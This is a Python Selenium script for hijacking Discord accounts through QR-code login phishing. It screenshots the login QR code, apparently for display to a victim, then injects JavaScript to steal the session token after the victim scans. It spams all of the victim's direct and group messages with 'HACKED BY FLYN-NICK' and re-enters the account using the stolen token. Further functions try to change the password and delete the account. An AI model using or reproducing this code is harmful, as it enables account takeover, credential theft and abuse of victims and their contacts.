from bs4 import BeautifulSoup
from selenium.webdriver import Chrome
from selenium.webdriver.common.keys import Keys
from time import sleep

DISCORD_LOGIN_URL = "https://discord.com/login"

def setup(driver):
    # load login page
    if driver.current_url != DISCORD_LOGIN_URL:
        driver.get(DISCORD_LOGIN_URL)
    qr_code = None
    sleep(0.25)
    # wait for qr code to load
    while True:
        soup = BeautifulSoup(driver.page_source, "html.parser")
        qr_code = soup.find("img", {"alt": "Scan me!"})
        if qr_code:
            break
    #print(qr_code["src"])
    # screenshot discord login, this will be displayed on the server webpage
    driver.get_screenshot_as_file("discord_login.png")

def wait_for_log_in(driver):
    # the list of dms is loaded after the user logs in
    dm_list = None
    while True:
        try:
            dm_list = driver.find_element_by_xpath("//nav[@class='privateChannels-1nO12o']")
        except:
            sleep(0.1)
            pass
        finally: 
            if dm_list: 
                break
    sleep(0.1)
    return dm_list

def spam_messages(driver, dm_list, message="HACKED BY FLYN-NICK"):
    sleep(1)
    try:
        for possible_dm in dm_list.find_elements_by_tag_name("a"):
            # some elements in the list aren't actually dms, this is to filter them out
            label = possible_dm.get_attribute("aria-label")
            if not label:
                continue
            # label ends with either of these if it is a dm
            if str.endswith(label, "(direct message)") or str.endswith(label, "(group message)"):
                # click dm to enter it
                possible_dm.click()
                # wait until you can access the text input
                text_input = None
                while True:
                    try:
                        text_input = driver.find_element_by_css_selector("div[data-slate-object='block'")
                    except:
                        pass
                    finally:
                        if text_input:
                            break
                # click on the text input so you can start typing
                text_input.click()
                # wait for the input to be ready
                input = None
                while True:
                    try: 
                        input = driver.find_element_by_css_selector("span[data-slate-object='text']")
                    except:
                        sleep(0.1)
                        pass
                    finally:
                        if input:
                            break
                # type in a message, end it with engt
                input.send_keys(f"{message}{Keys.ENTER}")
    except:
        pass
    sleep(0.1)

def logout(driver):
    # go to settings
    while True:
        try:
            settings_button = driver.find_element_by_xpath("//button[@aria-label='User Settings']")
            settings_button.click()
        except:
            sleep(0.2)
            pass
        else:
            break
    sleep(0.1) # wait for settings to load
    # click logout
    logout_button = driver.find_element_by_xpath("//div[@aria-controls='logout-tab']")
    logout_button.click()
    sleep(0.1) # wait for confirmation to lad
    # click confirm
    confirm_button = driver.find_element_by_xpath("//button[@type='submit']")
    confirm_button.click()
    sleep(1)

# UNUSABLE
def delete(driver):
    # go to settings
    settings_button = driver.find_element_by_xpath("//button[@aria-label='User Settings']")
    settings_button.click()
    sleep(0.1)
    # click the delete account button
    delete_button = driver.find_element_by_xpath("//button[@class='button-38aScr lookOutlined-3sRXeN colorRed-1TFJan sizeSmall-2cSMqn grow-q77ONN']")
    delete_button.click()
    sleep(0.1)
    # rest is actually not possible, to confirm deleting you must have their password
    # you can't disable their account either

# PRACTICALLY UNUSABLE
def change_password(driver, old_pass, new_pass):
    # can't use this function, impossible to get their password
    change_password_script = '''
    let oldpassword = "''' + old_pass + '''";
    let newpassword = "''' + new_pass + '''";
    window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.getToken !== undefined) {fetch("https://discord.com/api/v9/users/@me", { "credentials": "include", "body": "{\"password\":\"" + oldpassword + "\",\"new_password\":\"" + newpassword + "\"}", "method": "PATCH", "headers": { "Authorization": m.default.getToken(), "Content-Type":"application/json" }}); return}if (m.getToken !== undefined) {fetch("https://discord.com/api/v9/users/@me", {"credentials": "include","body": "{\"password\":\"" + oldpassword + "\",\"new_password\":\"" + newpassword + "\"}","method":"PATCH","headers": {"Authorization": m.getToken(), "Content-Type":"application/json"}});return}}}]);
    '''
    driver.execute_script(change_password_script)

def get_account_token(driver):
    token_script = "return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
    return driver.execute_script(token_script)

def login_with_auth_token(driver, token):
    driver.get(DISCORD_LOGIN_URL)
    sleep(0.1)
    # changes the login field to a new field that accepts the token
    script = 'function login(e) {setInterval(() => {window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {if (m.default && m.default.setToken !== undefined) {return m.default.setToken(e)}if (m.setToken !== undefined) {return m.setToken(e)}}}]);console.log("%cWorked!", "font-size: 50px");}, 50), setTimeout(() => {window.location.reload()}, 2500)}function buttonlogin(){login(document.getElementsByClassName("inputDefault-_djjkz input-cIJ7To")[0].value)}var element;(element=document.getElementsByClassName("marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN")[0]).addEventListener("click",buttonlogin),(element=document.getElementsByClassName("marginBottom20-32qID7")[0]).parentElement.removeChild(element),(element=document.getElementsByClassName("colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP")[0]).innerHTML="Token",element.id="Token",(element=document.getElementsByClassName("transitionGroup-aR7y1d qrLogin-1AOZMt")[0]).parentElement.removeChild(element),(element=document.getElementsByClassName("verticalSeparator-3huAjp")[0]).parentElement.removeChild(element);'
    driver.execute_script(script)
    sleep(0.1)
    # give the new field the token
    driver.find_element_by_xpath("//input[@type='password']").send_keys(token)
    sleep(0.1)
    # submit
    driver.find_element_by_xpath("//button[@type='submit']").click()
    sleep(0.1)

def main(driver=Chrome(executable_path="/usr/local/bin/chromedriver")):
    setup(driver)
    dm_list = wait_for_log_in(driver)
    token = get_account_token(driver)
    print(f"auth token: {token}")
    spam_messages(driver, dm_list)
    logout(driver)
    login_with_auth_token(driver, token)
    wait_for_log_in(driver)
    logout(driver)
    main(driver)

if __name__ == "__main__":
    main()